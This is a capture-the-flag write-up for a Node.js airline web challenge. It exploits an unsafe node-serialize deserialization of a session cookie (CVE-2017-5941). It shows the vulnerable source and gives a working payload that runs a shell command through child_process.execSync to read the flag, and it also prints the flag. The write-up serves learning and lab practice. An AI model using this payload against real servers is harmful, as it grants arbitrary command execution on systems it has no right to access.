# Hacky_Holidays_Airlines Web (100) 

## Challenge Description
We are given a website which runs node js code on the backend, and only has sign up and login functionalities.
## Challenge Files
After signing up and logging in, the user's data is serialized and base 64 encoded to form the cookie using **'node-serialize' module**.

```
const db = require("../models");
const bcrypt = require("bcryptjs");
var serialize = require('node-serialize');
var escape = require('escape-html');


module.exports = (app, globalConfig) => {    
    app.get('/login', (req, res) => {
        res.render('login', {title: 'Login' });
    })
    app.post("/login", (req, res) => {
        let username = req.body.username;
        let password = req.body.password;
        if (username && password) {
            db.Users.findAll({
                where: {
                    username: username,
                },
            }).then((results) => {
                if (results.length > 0) {
                    if (
                        bcrypt.compareSync(password, results[0].dataValues.hash)
                    ) {
                        res.clearCookie('session');
                        var userInfo = {
                            "id":results[0].id,
                            "username":req.body.username,
                            "country":results[0].country
                        };
                        var cookieGen = serialize.serialize(userInfo, true);
                        var cookieValue = new Buffer(cookieGen, 'utf-8').toString('base64');
                        res.cookie('session', cookieValue, {
                            maxAge: 900000,
                            httpOnly: true,
                        });
                        res.redirect("/");
                    } else {
                        res.render("errors", {
                            error: "Incorrect username or password",
                        });                        
                    }
                } else {
                    res.render("errors", {
                        error: "Incorrect username or password",
                    });
                }
            });
        } else {
            res.render("errors", {
                error: "Empty fields",
            });
        }
    });
};
```

Once logged in, the cookie is decoded and deserialized to retrieve the username of the user.
```
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');

module.exports = (app, globalConfig) => {
    app.use(cookieParser())
    app.get('/', function(req, res) {
      if (req.cookies.session){
        authorized = true;
        var cookieValue = new Buffer(escape((req.cookies.session)), 'base64').toString();
        var userInfo = serialize.unserialize(cookieValue);
        if (userInfo.username) {
          res.render('index', { title: 'Home', username: userInfo.username , authorized: authorized});
        }
        } else {
        authorized = false;
        res.render('index', { title: 'Home', authorized: authorized });
      }
    });
};
```

## Solution
Searching the web for node js deserialization vulnurabilities led me to (CVE-2017-5941) and blogposts (https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/), (https://blog.websecurify.com/2017/02/hacking-node-serialize.html). The vulnurability comes internally as the deserialization process utilises eval(), source code:(https://github.com/luin/serialize/blob/c82e7c3c7e802002ae794162508ee930f4506842/lib/serialize.js#L76).

Attemped to spawn a spawn a reverse shell without success. Then tried to read flag directly as user input is reflected on the website.

## Payload

```
{"id":"1658671155127.0","username":"_$$ND_FUNC$$_function (){\n var a =require('child_process').execSync(\"cat ./flag\", function puts(error, stdout, stderr) {});\n return a;}()","country":"test"}
```

## Flag
```
CTF{45e_r34LLy_und3rst00d_7h3_pr0bl3m}
```

